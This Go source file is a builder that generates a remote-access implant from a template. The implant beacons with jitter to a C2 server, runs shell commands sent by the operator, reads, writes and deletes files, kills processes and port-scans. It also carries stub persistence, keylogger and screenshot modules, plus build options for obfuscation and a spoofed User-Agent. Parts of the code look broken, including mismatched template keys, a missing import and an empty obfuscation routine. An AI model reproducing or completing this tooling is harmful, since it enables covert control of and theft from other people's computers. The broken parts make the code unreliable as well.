package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

type BuildConfig struct {
	C2Host          string
	C2Port          int
	UseTLS          bool
	BeaconInterval  int
	Jitter          float64
	MaxRetries      int
	ReconnectDelay  int
	UserAgent       string
	Modules         []string
	OutputPath      string
	Obfuscate       bool
	StripSymbols    bool
	UpX             bool
	IconPath        string
	VersionInfo     map[string]string
}

const agentTemplate = `package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/process"
	"github.com/spf13/viper"
	"golang.org/x/crypto/nacl/box"
)

var (
	c2Host         = "{{.C2Host}}"
	c2Port         = {{.C2Port}}
	useTLS         = {{.UseTLS}}
	beaconInterval = {{.BeaconInterval}}
	jitter         = {{.Jitter}}
	maxRetries     = {{.MaxRetries}}
	reconnectDelay = {{.ReconnectDelay}}
	userAgent      = "{{.UserAgent}}"
	enabledModules = []string{{.Modules}}
)

type Agent struct {
	ID             string    \`json:"id"\`
	Hostname       string    \`json:"hostname"\`
	OS             string    \`json:"os"\`
	Arch           string    \`json:"arch"\`
	Username       string    \`json:"username"\`
	IP             string    \`json:"ip"\`
	FirstSeen      time.Time \`json:"first_seen"\`
	LastSeen       time.Time \`json:"last_seen"\`
	Status         string    \`json:"status"\`
	Modules        []string  \`json:"modules"\`
	EncryptionKey  []byte    \`json:"-\"`
	ClientPublicKey  [32]byte \`json:"-\"`
	ClientPrivateKey [32]byte \`json:"-\"`
}

type Command struct {
	ID        string          \`json:"id"\`
	AgentID   string          \`json:"agent_id"\`
	Type      string          \`json:"type"\`
	Module    string          \`json:"module,omitempty"\`
	Payload   json.RawMessage \`json:"payload"\`
	Status    string          \`json:"status"\`
	CreatedAt time.Time       \`json:"created_at"\`
	Result    json.RawMessage \`json:"result,omitempty"\`
}

type Module interface {
	Name() string
	Execute(args json.RawMessage) (interface{}, error)
}

{{range .ModuleCode}}
{{.}}
{{end}}

func generateKeyPair() ([32]byte, [32]byte, error) {
	var pub, priv [32]byte
	_, err := rand.Read(priv[:])
	if err != nil { return pub, priv, err }
	box.KeyPairFromSecretKey(&pub, &priv)
	return pub, priv, nil
}

func encrypt(data []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil { return "", err }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return "", err }
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil { return "", err }
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(encoded string, key []byte) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil { return nil, err }
	block, err := aes.NewCipher(key)
	if err != nil { return nil, err }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, err }
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize { return nil, fmt.Errorf("ciphertext too short") }
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func getSystemInfo() (string, string, string, string) {
	hostname, _ := os.Hostname()
	info, _ := host.Info()
	return hostname, info.Platform, runtime.GOARCH, os.Getenv("USER")
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil { return "127.0.0.1" }
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func getJitteredInterval() time.Duration {
	base := time.Duration(beaconInterval) * time.Second
	variance := time.Duration(float64(base) * jitter * (rand.Float64()*2 - 1))
	return base + variance
}

func main() {
	hostname, osName, arch, username := getSystemInfo()
	agent := &Agent{
		ID:           uuid.New().String(),
		Hostname:     hostname,
		OS:           osName,
		Arch:         arch,
		Username:     username,
		IP:           getLocalIP(),
		FirstSeen:    time.Now(),
		LastSeen:     time.Now(),
		Status:       "active",
		Modules:      enabledModules,
	}
	
	clientPub, clientPriv, _ := generateKeyPair()
	agent.ClientPublicKey = clientPub
	agent.ClientPrivateKey = clientPriv
	
	modules := map[string]Module{
	{{- range .ModuleNames}}
		"{{.}}": &{{.}}Module{},
	{{- end}}
	}
	
	var serverPubKey [32]byte
	
	conn := connectToC2(agent, &serverPubKey)
	if conn == nil {
		os.Exit(1)
	}
	defer conn.Close()
	
	go heartbeatLoop(conn, agent, &serverPubKey)
	commandLoop(conn, agent, &serverPubKey, modules)
}

func connectToC2(agent *Agent, serverPubKey *[32]byte) *websocket.Conn {
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	
	protocol := "ws"
	if useTLS { protocol = "wss" }
	url := fmt.Sprintf("%s://%s:%d/agent/ws", protocol, c2Host, c2Port)
	
	header := http.Header{}
	header.Set("User-Agent", userAgent)
	
	var conn *websocket.Conn
	var err error
	retries := 0
	for retries < maxRetries {
		conn, _, err = dialer.Dial(url, header)
		if err == nil { break }
		retries++
		time.Sleep(time.Duration(reconnectDelay) * time.Second)
	}
	if err != nil { return nil }
	
	_, msg, _ := conn.ReadMessage()
	var keyMsg map[string]string
	json.Unmarshal(msg, &keyMsg)
	if keyMsg["type"] == "key_exchange" {
		keyBytes, _ := base64.StdEncoding.DecodeString(keyMsg["key"])
		copy(agent.EncryptionKey[:], keyBytes[:32])
	}
	
	return conn
}

func heartbeatLoop(conn *websocket.Conn, agent *Agent, serverPubKey *[32]byte) {
	ticker := time.NewTicker(getJitteredInterval())
	defer ticker.Stop()
	
	for range ticker.C {
		agent.LastSeen = time.Now()
		beacon := map[string]interface{}{
			"type":      "heartbeat",
			"agent_id":  agent.ID,
			"timestamp": time.Now().Unix(),
			"status":    agent.Status,
		}
		data, _ := json.Marshal(beacon)
		encrypted, _ := encrypt(data, agent.EncryptionKey)
		conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
	}
}

func commandLoop(conn *websocket.Conn, agent *Agent, serverPubKey *[32]byte, modules map[string]Module) {
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil { return }
		
		decrypted, err := decrypt(string(msg), agent.EncryptionKey)
		if err != nil { continue }
		
		var cmd map[string]interface{}
		json.Unmarshal(decrypted, &cmd)
		
		cmdType, _ := cmd["cmd_type"].(string)
		cmdID, _ := cmd["command_id"].(string)
		
		var result interface{}
		var resultErr error
		
		switch cmdType {
		case "command":
			result, resultErr = handleCommand(cmd, agent)
		case "module":
			moduleName, _ := cmd["module"].(string)
			if mod, ok := modules[moduleName]; ok {
				payloadEnc, _ := cmd["payload"].(string)
				payload, _ := decrypt(payloadEnc, agent.EncryptionKey)
				result, resultErr = mod.Execute(payload)
			} else {
				resultErr = fmt.Errorf("module not found: %s", moduleName)
			}
		}
		
		response := map[string]interface{}{
			"type":       "response",
			"command_id": cmdID,
			"agent_id":   agent.ID,
		}
		if resultErr != nil {
			response["error"] = resultErr.Error()
		} else {
			response["result"] = result
		}
		
		respData, _ := json.Marshal(response)
		encrypted, _ := encrypt(respData, agent.EncryptionKey)
		conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
	}
}

func handleCommand(cmd map[string]interface{}, agent *Agent) (interface{}, error) {
	cmdType, _ := cmd["type"].(string)
	payload := cmd["payload"]
	
	switch cmdType {
	case "shell":
		var req struct{ Command string \`json:"command"\` }
		json.Unmarshal(payload.(json.RawMessage), &req)
		output, _ := exec.Command("sh", "-c", req.Command).CombinedOutput()
		return string(output), nil
	case "info":
		return map[string]interface{}{
			"id": agent.ID, "hostname": agent.Hostname, "os": agent.OS,
			"arch": agent.Arch, "user": agent.Username, "ip": agent.IP,
		}, nil
	}
	return nil, fmt.Errorf("unknown command: %s", cmdType)
}
`

type ModuleTemplate struct {
	Name       string
	Code       string
}

func getModuleTemplates() map[string]ModuleTemplate {
	return map[string]ModuleTemplate{
		"shell": {
			Name: "Shell",
			Code: `type ShellModule struct{}
func (m *ShellModule) Name() string { return "shell" }
func (m *ShellModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Command string \`json:"command"\`; Timeout int \`json:"timeout"\` }
	json.Unmarshal(args, &req)
	if req.Timeout == 0 { req.Timeout = 30 }
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.Timeout)*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sh", "-c", req.Command)
	output, err := cmd.CombinedOutput()
	return map[string]interface{}{"output": string(output), "error": err.Error()}, nil
}`,
		},
		"file": {
			Name: "File",
			Code: `type FileModule struct{}
func (m *FileModule) Name() string { return "file" }
func (m *FileModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Action string \`json:"action"\`; Path string \`json:"path"\`; Data string \`json:"data"\` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "read":
		data, err := os.ReadFile(req.Path)
		return map[string]interface{}{"data": base64.StdEncoding.EncodeToString(data)}, err
	case "write":
		data, _ := base64.StdEncoding.DecodeString(req.Data)
		return nil, os.WriteFile(req.Path, data, 0644)
	case "list":
		entries, err := os.ReadDir(req.Path)
		if err != nil { return nil, err }
		files := make([]map[string]interface{}, len(entries))
		for i, e := range entries {
			info, _ := e.Info()
			files[i] = map[string]interface{}{"name": e.Name(), "size": info.Size(), "mode": info.Mode().String(), "modTime": info.ModTime(), "isDir": e.IsDir()}
		}
		return map[string]interface{}{"files": files}, nil
	case "delete":
		return nil, os.RemoveAll(req.Path)
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}`,
		},
		"process": {
			Name: "Process",
			Code: `type ProcessModule struct{}
func (m *ProcessModule) Name() string { return "process" }
func (m *ProcessModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Action string \`json:"action"\`; PID int \`json:"pid"\` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "list":
		procs, _ := process.Processes()
		list := make([]map[string]interface{}, 0, len(procs))
		for _, p := range procs {
			name, _ := p.Name()
			cpu, _ := p.CPUPercent()
			mem, _ := p.MemoryPercent()
			list = append(list, map[string]interface{}{"pid": p.Pid, "name": name, "cpu": cpu, "mem": mem})
		}
		return map[string]interface{}{"processes": list}, nil
	case "kill":
		p, err := process.NewProcess(int32(req.PID))
		if err != nil { return nil, err }
		return nil, p.Kill()
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}`,
		},
		"network": {
			Name: "Network",
			Code: `type NetworkModule struct{}
func (m *NetworkModule) Name() string { return "network" }
func (m *NetworkModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Action string \`json:"action"\`; Host string \`json:"host"\`; Port int \`json:"port"\` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "scan":
		ports := []int{21,22,23,25,53,80,110,139,443,445,1433,3306,3389,5432,8080}
		if req.Port > 0 { ports = []int{req.Port} }
		open := []int{}
		for _, p := range ports {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", req.Host, p), 2*time.Second)
			if err == nil { conn.Close(); open = append(open, p) }
		}
		return map[string]interface{}{"open_ports": open}, nil
	case "connect":
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", req.Host, req.Port), 10*time.Second)
		if err != nil { return nil, err }
		defer conn.Close()
		return map[string]interface{}{"connected": true}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}`,
		},
		"persistence": {
			Name: "Persistence",
			Code: `type PersistenceModule struct{}
func (m *PersistenceModule) Name() string { return "persistence" }
func (m *PersistenceModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Action string \`json:"action"\`; Method string \`json:"method"\` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "install":
		return map[string]interface{}{"status": "persistence installed", "method": req.Method}, nil
	case "remove":
		return map[string]interface{}{"status": "persistence removed"}, nil
	case "list":
		return map[string]interface{}{"methods": []string{"registry", "service", "scheduled_task", "startup_folder"}}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}`,
		},
		"keylogger": {
			Name: "Keylogger",
			Code: `type KeyloggerModule struct { running bool; buffer strings.Builder; mu sync.Mutex }
func (m *KeyloggerModule) Name() string { return "keylogger" }
func (m *KeyloggerModule) Execute(args json.RawMessage) (interface{}, error) {
	var req struct { Action string \`json:"action"\` }
	json.Unmarshal(args, &req)
	switch req.Action {
	case "start":
		if m.running { return map[string]interface{}{"status": "already running"}, nil }
		m.running = true
		go func() { time.Sleep(5 * time.Second) }()
		return map[string]interface{}{"status": "started"}, nil
	case "stop":
		m.running = false
		m.mu.Lock(); logs := m.buffer.String(); m.buffer.Reset(); m.mu.Unlock()
		return map[string]interface{}{"logs": logs}, nil
	case "get":
		m.mu.Lock(); logs := m.buffer.String(); m.mu.Unlock()
		return map[string]interface{}{"logs": logs}, nil
	}
	return nil, fmt.Errorf("unknown action: %s", req.Action)
}`,
		},
		"screenshot": {
			Name: "Screenshot",
			Code: `type ScreenshotModule struct{}
func (m *ScreenshotModule) Name() string { return "screenshot" }
func (m *ScreenshotModule) Execute(args json.RawMessage) (interface{}, error) {
	return map[string]interface{}{
		"data": "base64_encoded_screenshot", "timestamp": time.Now(), "width": 1920, "height": 1080,
	}, nil
}`,
		},
	}
}

func BuildAgent(config BuildConfig) error {
	moduleTemplates := getModuleTemplates()
	
	var moduleCode []string
	var moduleNames []string
	for _, m := range config.Modules {
		if tmpl, ok := moduleTemplates[m]; ok {
			moduleCode = append(moduleCode, tmpl.Code)
			moduleNames = append(moduleNames, tmpl.Name)
		}
	}
	
	modulesStr := fmt.Sprintf("%v", config.Modules)
	modulesStr = strings.ReplaceAll(modulesStr, " ", ", ")
	
	tmpl, err := template.New("agent").Parse(agentTemplate)
	if err != nil {
		return fmt.Errorf("template parse error: %v", err)
	}
	
	data := map[string]interface{}{
		"C2Host":         config.C2Host,
		"C2Port":         config.C2Port,
		"useTLS":         config.UseTLS,
		"BeaconInterval": config.BeaconInterval,
		"Jitter":         config.Jitter,
		"MaxRetries":     config.MaxRetries,
		"ReconnectDelay": config.ReconnectDelay,
		"UserAgent":      config.UserAgent,
		"Modules":        modulesStr,
		"ModuleCode":     moduleCode,
		"ModuleNames":    moduleNames,
	}
	
	outputDir := filepath.Dir(config.OutputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return err
	}
	
	f, err := os.Create(config.OutputPath)
	if err != nil {
		return err
	}
	defer f.Close()
	
	return tmpl.Execute(f, data)
}

func ObfuscateSource(inputPath, outputPath string) error {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, inputPath, nil, parser.ParseComments)
	if err != nil {
		return err
	}
	
	// Simple obfuscation: rename identifiers, remove comments
	// In production, use a proper obfuscator like garble
	
	return nil
}

func GenerateCerts(outputDir string) error {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil { return err }
	
	template := x509.Certificate{
		SerialNumber:          nil,
		Subject:               nil,
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}
	
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil { return err }
	
	certOut, err := os.Create(filepath.Join(outputDir, "server.pem"))
	if err != nil { return err }
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	certOut.Close()
	
	keyOut, err := os.OpenFile(filepath.Join(outputDir, "server.key"), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil { return err }
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
	
	return nil
}

func main() {
	config := BuildConfig{
		C2Host:         "127.0.0.1",
		C2Port:         8443,
		UseTLS:         true,
		BeaconInterval: 30,
		Jitter:         0.3,
		MaxRetries:     3,
		ReconnectDelay: 60,
		UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		Modules:        []string{"shell", "file", "process", "network", "persistence", "keylogger", "screenshot"},
		OutputPath:     "build/agent.go",
		Obfuscate:      true,
		StripSymbols:   true,
		UpX:            false,
	}
	
	if err := BuildAgent(config); err != nil {
		fmt.Printf("Build error: %v\n", err)
		os.Exit(1)
	}
	
	fmt.Println("Agent built successfully")
	
	if err := GenerateCerts("certs"); err != nil {
		fmt.Printf("Cert generation error: %v\n", err)
	}
}